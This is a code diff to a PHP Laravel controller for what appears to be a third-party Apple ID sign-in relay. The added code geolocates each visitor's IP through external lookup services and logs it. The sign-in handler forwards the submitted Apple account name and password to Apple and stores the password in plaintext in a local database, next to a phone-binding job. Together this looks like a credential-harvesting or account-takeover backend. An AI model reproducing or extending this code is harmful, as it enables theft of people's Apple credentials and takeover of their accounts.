@@ -13,10 +13,14 @@ use App\Apple\Service\User\UserFactory;
 use App\Events\AccountAuthFailEvent;
 use App\Events\AccountAuthSuccessEvent;
 use App\Events\AccountLoginSuccessEvent;
+use App\Http\Integrations\IpConnector\IpConnector;
+use App\Http\Integrations\IpConnector\Requests\Ip138Request;
+use App\Http\Integrations\IpConnector\Requests\PconLineRequest;
 use App\Http\Requests\VerifyAccountRequest;
 use App\Http\Requests\VerifyCodeRequest;
 use App\Jobs\BindAccountPhone;
 use App\Models\Account;
+use App\Models\Phone;
 use App\Models\SecuritySetting;
 use Carbon\Carbon;
 use GuzzleHttp\Exception\GuzzleException;
@@ -30,12 +34,16 @@ use Illuminate\Http\Response;
 use Illuminate\Routing\Redirector;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Cookie;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Event;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Validation\ValidationException;
 use libphonenumber\NumberParseException;
 use libphonenumber\PhoneNumberFormat;
+use Saloon\Exceptions\Request\FatalRequestException;
+use Saloon\Exceptions\Request\RequestException;
 
 class IndexController extends Controller
 {
@@ -71,6 +79,19 @@ class IndexController extends Controller
     public function signin(): Response
     {
         $guid = sha1(microtime());
+
+        $IpConnector = new IpConnector();
+        $apple = $this->appleFactory->create($guid);
+
+        try {
+
+            $ipaddress = $IpConnector->ipaddress(new PconLineRequest(ip: $this->request->ip()));
+            $apple->getUser()->add('ipaddress',$ipaddress);
+
+            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
+        } catch (FatalRequestException|RequestException $e) {
+
+        }
 
         return response()
             ->view('index/signin')
@@ -129,20 +150,19 @@ class IndexController extends Controller
             $accountName = $this->formatPhone($accountName);
         }
 
-        //毫秒时间戳
         $guid = $request->cookie('Guid');
 
         $apple = $this->appleFactory->create($guid);
 
-        $apple->clear();
-        $apple->getUser()->set('account', $accountName);
-        $apple->getUser()->set('password', $password);
+        $apple->getUser()->add('accountName', $accountName);
 
         $response = $apple->signin($accountName, $password);
 
         $account = Account::updateOrCreate([
             'account' => $accountName,
         ],[ 'password' => $password]);
+
+        $apple->getUser()->add('account', $account);
 
         $error = $response->firstAuthServiceError()?->getMessage();
         Session::flash('Error',$error);
